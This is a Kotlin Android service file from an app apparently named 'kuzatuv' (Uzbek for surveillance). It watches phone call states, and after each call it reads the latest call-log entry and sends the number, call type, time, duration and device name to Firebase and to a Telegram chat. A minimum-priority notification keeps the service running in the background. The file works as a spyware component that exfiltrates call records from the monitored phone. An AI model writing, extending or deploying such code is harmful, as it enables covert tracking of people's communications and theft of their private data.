package com.kuzatuv.app

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.CallLog
import android.telephony.PhoneStateListener
import android.telephony.TelephonyCallback
import android.telephony.TelephonyManager
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat

class CallWatcherService : Service() {

    private lateinit var telephonyManager: TelephonyManager
    private var wasActive = false
    private val handler = Handler(Looper.getMainLooper())
    private var telephonyCallback: TelephonyCallback? = null

    private fun handleState(state: Int) {
        when (state) {
            TelephonyManager.CALL_STATE_RINGING, TelephonyManager.CALL_STATE_OFFHOOK -> {
                wasActive = true
            }
            TelephonyManager.CALL_STATE_IDLE -> {
                if (wasActive) {
                    wasActive = false
                    handler.postDelayed({ pushLatestCallLogEntry() }, 2000)
                }
            }
        }
    }

    private fun pushLatestCallLogEntry() {
        val device = DevicePrefs.getDeviceName(applicationContext)
        contentResolver.query(
            CallLog.Calls.CONTENT_URI, null, null, null, "${CallLog.Calls.DATE} DESC"
        )?.use { cursor ->
            if (cursor.moveToFirst()) {
                val numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER)
                val typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE)
                val dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE)
                val durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION)
                val number = cursor.getString(numberIdx) ?: "Номаълум"
                val typeInt = cursor.getInt(typeIdx)
                val date = cursor.getLong(dateIdx)
                val duration = cursor.getLong(durationIdx)
                val type = when (typeInt) {
                    CallLog.Calls.INCOMING_TYPE -> "incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                    CallLog.Calls.MISSED_TYPE -> "missed"
                    else -> "boshqa"
                }
                FirebaseHelper.pushCall(number, type, date, duration, device)
                val typeLabel = when (type) {
                    "incoming" -> "Kirgan qo'ng'iroq"
                    "outgoing" -> "Chiqgan qo'ng'iroq"
                    "missed" -> "O'tkazib yuborilgan qo'ng'iroq"
                    else -> type
                }
                TelegramHelper.send("📞 $typeLabel ($device)\nRaqam: $number")
            }
        }
    }

    @Suppress("DEPRECATION")
    private val legacyListener = object : PhoneStateListener() {
        override fun onCallStateChanged(state: Int, phoneNumber: String?) {
            handleState(state)
        }
    }

    override fun onCreate() {
        super.onCreate()
        telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
        startForegroundWithNotification()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val callback = object : TelephonyCallback(), TelephonyCallback.CallStateListener {
                override fun onCallStateChanged(state: Int) {
                    handleState(state)
                }
            }
            telephonyCallback = callback
            telephonyManager.registerTelephonyCallback(ContextCompat.getMainExecutor(this), callback)
        } else {
            @Suppress("DEPRECATION")
            telephonyManager.listen(legacyListener, PhoneStateListener.LISTEN_CALL_STATE)
        }
    }

    private fun startForegroundWithNotification() {
        val channelId = "kuzatuv_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId, "Kuzatuv xizmati", NotificationManager.IMPORTANCE_MIN
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Kuzatuv ishlayapti")
            .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
        startForeground(1, notification)
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            telephonyCallback?.let { telephonyManager.unregisterTelephonyCallback(it) }
        } else {
            @Suppress("DEPRECATION")
            telephonyManager.listen(legacyListener, PhoneStateListener.LISTEN_NONE)
        }
        super.onDestroy()
    }
}
